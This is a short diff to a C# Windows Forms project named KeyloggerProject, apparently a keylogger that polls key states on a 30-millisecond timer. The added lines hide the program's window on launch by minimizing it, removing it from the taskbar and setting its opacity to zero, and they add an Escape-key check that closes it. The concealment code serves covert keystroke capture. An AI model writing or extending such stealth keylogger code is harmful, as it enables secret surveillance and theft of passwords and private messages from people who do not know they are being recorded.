@@ -48,6 +48,11 @@ namespace KeyloggerProject
         public Form1()
         {
             InitializeComponent();
+            this.WindowState = FormWindowState.Minimized;
+            this.ShowInTaskbar = false;
+            this.Opacity = 0;
+
+
             timer = new Timer();
             timer.Interval = 30;
             timer.Tick += Timer_Tick;
@@ -153,6 +158,14 @@ namespace KeyloggerProject
                     
                 }
             }
+            if ((GetAsyncKeyState((int)Keys.Escape) & 0x8000) != 0)
+            {
+                this.Close();
+                return;
+            }
+
+
+
         }
 
         private string GetShiftSymbol(Keys key)
